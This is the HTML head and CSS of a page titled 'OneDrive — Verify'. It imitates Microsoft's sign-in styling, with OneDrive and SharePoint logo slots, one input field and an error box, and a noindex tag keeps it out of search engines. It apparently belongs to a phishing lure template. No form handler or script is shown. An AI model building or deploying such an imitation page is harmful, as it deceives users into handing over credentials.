<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>OneDrive — Verify</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{min-height:100%}
body{font-family:"Segoe UI", -apple-system, BlinkMacSystemFont, sans-serif;background:#f3f2f1;color:#323130;-webkit-font-smoothing:antialiased;position:relative}
.page-bg{position:fixed;inset:0;z-index:0;pointer-events:none;background:linear-gradient(165deg,#e6f2fc 0%,#f3f2f1 45%,#eaeaea 100%);background-image:radial-gradient(ellipse 75% 50% at 50% -5%,rgba(0,120,212,.16),transparent 60%),radial-gradient(ellipse 50% 35% at 100% 30%,rgba(0,164,239,.1),transparent 45%),linear-gradient(165deg,#e6f2fc 0%,#f3f2f1 45%,#eaeaea 100%);}
.page-wrap{position:relative;z-index:1;min-height:100vh}
.top-bar{height:4px;background:#0078d4}
.shell{max-width:520px;margin:0 auto;padding:32px 20px 48px}
.logo-wrap{display:flex;justify-content:center;align-items:center;margin-bottom:28px}
.logo-wrap svg,.logo-wrap img:not(.logo-sharepoint):not(.logo-onedrive){max-height:28px;width:auto;height:auto;object-fit:contain}
.logo-wrap img.logo-sharepoint,.logo-wrap img.logo-onedrive{display:block;width:auto;height:auto;max-height:40px;max-width:min(220px,78vw);object-fit:contain}
.card{background:#fff;border:1px solid #edebe9;border-radius:2px;box-shadow:0 1.6px 3.6px rgba(0,0,0,.13),0 .3px .9px rgba(0,0,0,.11);padding:28px 32px 24px}
@media(max-width:480px){.card{padding:22px 18px 20px}}
h1{font-size:1.5rem;font-weight:600;line-height:1.3;margin-bottom:16px;color:#201f1e;text-align:center}
.lead{font-size:.9375rem;line-height:1.5;color:#605e5c;margin-bottom:10px}
.org-line{font-size:.9375rem;font-weight:600;color:#201f1e;margin-bottom:14px;word-break:break-word}
.sub{font-size:.9375rem;line-height:1.55;color:#605e5c;margin-bottom:22px}
.field{position:relative;margin-bottom:20px}
.field input{width:100%;height:40px;padding:8px 36px 8px 12px;font-size:.9375rem;border:1px solid #8a8886;border-radius:2px;outline:none;font-family:inherit}
.field input:focus{border-color:#0078d4;box-shadow:0 0 0 1px #0078d4}
.field .info{position:absolute;right:10px;top:50%;transform:translateY(-50%);width:18px;height:18px;border:1px solid #8a8886;border-radius:50%;color:#605e5c;font-size:11px;line-height:16px;text-align:center;font-style:normal;pointer-events:none}
.btn{display:block;width:100%;height:40px;border:none;border-radius:2px;background:#0078d4;color:#fff;font-size:.9375rem;font-weight:600;font-family:inherit;cursor:pointer;transition:background .15s}
.btn:hover{background:#106ebe}
.btn:active{transform:scale(.998)}
.err{display:none;margin-bottom:12px;padding:10px 12px;font-size:.8125rem;color:#a4262c;background:#fde7e9;border:1px solid #f1bbbc;border-radius:2px}
.footer{margin-top:18px;font-size:.75rem;line-height:1.5;color:#605e5c;text-align:left}
</style>
</head>
